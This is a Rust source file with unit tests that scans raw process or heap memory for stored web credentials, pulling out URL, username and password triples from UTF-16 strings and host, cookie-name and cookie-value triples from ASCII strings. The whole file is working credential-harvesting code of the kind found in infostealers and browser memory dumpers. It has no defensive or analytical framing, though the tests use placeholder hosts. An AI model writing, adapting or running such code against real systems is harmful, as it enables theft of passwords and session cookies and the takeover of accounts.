//! Pattern-free fallback: scan heap for Unicode (URL, username, password) triples.

#[derive(Debug, Clone)]
pub struct PasswordTriple {
    pub url: String,
    pub username: String,
    pub password: String,
}

/// Walk `mem` looking for Unicode "https://..." strings, then within a fixed window
/// after each URL look for two more length-prefixed Unicode strings.
pub fn scan_heap_for_passwords(mem: &[u8]) -> Vec<PasswordTriple> {
    let mut out = Vec::new();
    // Scan for UTF-16LE "https://" -> h\0 t\0 t\0 p\0 s\0 :\0 /\0 /\0
    let needle: &[u8] = b"h\0t\0t\0p\0s\0:\0/\0/\0";
    let mut i = 0usize;
    while i + needle.len() <= mem.len() {
        if &mem[i..i + needle.len()] == needle {
            if let Some(t) = harvest_at(mem, i) {
                if plausible(&t) {
                    out.push(t);
                }
            }
            i += needle.len();
        } else {
            i += 1;
        }
    }
    out
}

fn harvest_at(mem: &[u8], at: usize) -> Option<PasswordTriple> {
    // Read UTF-16LE up to a NUL terminator, max 4096 chars.
    let url = read_utf16le_until_nul(mem, at, 4096)?;
    // Within ~16KB after the URL, find two more length-bounded strings = username, password.
    let window_end = (at + url.len() * 2 + 16384).min(mem.len());
    let mut found_strings: Vec<(usize, String)> = Vec::new();
    let mut k = at + url.len() * 2;
    while k < window_end && found_strings.len() < 8 {
        if let Some(s) = read_utf16le_until_nul(mem, k, 256) {
            if !s.is_empty() && s.chars().all(|c| !c.is_control() || c == ' ') {
                found_strings.push((k, s.clone()));
                k += s.len() * 2 + 2;
                continue;
            }
        }
        k += 2;
    }
    if found_strings.len() >= 2 {
        Some(PasswordTriple {
            url,
            username: found_strings[0].1.clone(),
            password: found_strings[1].1.clone(),
        })
    } else { None }
}

fn read_utf16le_until_nul(mem: &[u8], at: usize, max_chars: usize) -> Option<String> {
    let mut units = Vec::new();
    let mut i = at;
    while i + 2 <= mem.len() && units.len() < max_chars {
        let u = u16::from_le_bytes([mem[i], mem[i + 1]]);
        if u == 0 { break; }
        units.push(u);
        i += 2;
    }
    if units.is_empty() { return None; }
    Some(String::from_utf16_lossy(&units))
}

fn plausible(t: &PasswordTriple) -> bool {
    t.url.starts_with("https://")
        && t.url.len() < 2048
        && !t.username.is_empty() && t.username.len() < 256
        && !t.password.is_empty() && t.password.len() < 256
        && !t.username.contains('\u{FFFD}')
        && !t.password.contains('\u{FFFD}')
}

#[derive(Debug, Clone)]
pub struct CookieTriple {
    pub host: String,
    pub name: String,
    pub value: String,
}

/// Scan ASCII host strings (domain-looking) followed by a cookie name and value
/// within a small window.
pub fn scan_heap_for_cookies(mem: &[u8]) -> Vec<CookieTriple> {
    let mut out = Vec::new();
    let mut i = 0usize;
    while i < mem.len() {
        if mem[i] == b'.' || mem[i].is_ascii_alphabetic() {
            if let Some((host, len)) = read_ascii_domain(&mem[i..]) {
                let mut k = i + len + 1;
                let win_end = (k + 2048).min(mem.len());
                let mut strs: Vec<String> = Vec::new();
                while k < win_end && strs.len() < 4 {
                    if let Some((s, slen)) = read_ascii_cstr(&mem[k..]) {
                        if !s.is_empty() && s.len() < 4096 {
                            strs.push(s);
                        }
                        k += slen + 1;
                    } else {
                        k += 1;
                    }
                }
                if strs.len() >= 2 {
                    let triple = CookieTriple {
                        host,
                        name: strs[0].clone(),
                        value: strs[1].clone(),
                    };
                    if plausible_cookie(&triple) {
                        out.push(triple);
                    }
                }
                i += len + 1;
                continue;
            }
        }
        i += 1;
    }
    out
}

fn read_ascii_domain(b: &[u8]) -> Option<(String, usize)> {
    let mut n = 0;
    while n < b.len() && n < 256 {
        let c = b[n];
        if c == 0 { break; }
        if !(c.is_ascii_alphanumeric() || c == b'.' || c == b'-' || c == b'_') {
            return None;
        }
        n += 1;
    }
    if n < 4 { return None; }
    let s = std::str::from_utf8(&b[..n]).ok()?.to_string();
    if !s.contains('.') { return None; }
    Some((s, n))
}

fn read_ascii_cstr(b: &[u8]) -> Option<(String, usize)> {
    let mut n = 0;
    while n < b.len() && n < 4096 {
        let c = b[n];
        if c == 0 { break; }
        if c < 0x20 || c > 0x7E { return None; }
        n += 1;
    }
    if n == 0 { return None; }
    let s = std::str::from_utf8(&b[..n]).ok()?.to_string();
    Some((s, n))
}

fn plausible_cookie(t: &CookieTriple) -> bool {
    t.host.contains('.')
        && t.host.len() < 256
        && !t.name.is_empty()
        && !t.value.is_empty()
        && t.value.len() > 8 // cookies aren't usually 1-char
}

#[cfg(test)]
mod tests {
    use super::*;

    fn utf16(s: &str) -> Vec<u8> {
        let mut v = Vec::new();
        for u in s.encode_utf16() {
            v.extend_from_slice(&u.to_le_bytes());
        }
        v.extend_from_slice(&[0, 0]); // nul
        v
    }

    #[test]
    fn finds_triple() {
        let mut buf = vec![0u8; 64];
        buf.extend(utf16("https://target.example/login"));
        buf.extend(vec![0u8; 16]);
        buf.extend(utf16("alice"));
        buf.extend(vec![0u8; 16]);
        buf.extend(utf16("P@ssw0rd"));
        buf.extend(vec![0u8; 64]);
        let r = scan_heap_for_passwords(&buf);
        assert_eq!(r.len(), 1);
        assert_eq!(r[0].url, "https://target.example/login");
        assert_eq!(r[0].username, "alice");
        assert_eq!(r[0].password, "P@ssw0rd");
    }

    #[test]
    fn finds_cookie_triple() {
        let mut buf = vec![0u8; 16];
        buf.extend_from_slice(b".target.example\0");
        buf.extend_from_slice(b"SESSION\0");
        buf.extend_from_slice(b"AbCdEf012345XXX\0");
        buf.extend(vec![0u8; 16]);
        let r = scan_heap_for_cookies(&buf);
        assert_eq!(r.len(), 1);
        assert_eq!(r[0].host, ".target.example");
        assert_eq!(r[0].name, "SESSION");
        assert_eq!(r[0].value, "AbCdEf012345XXX");
    }
}
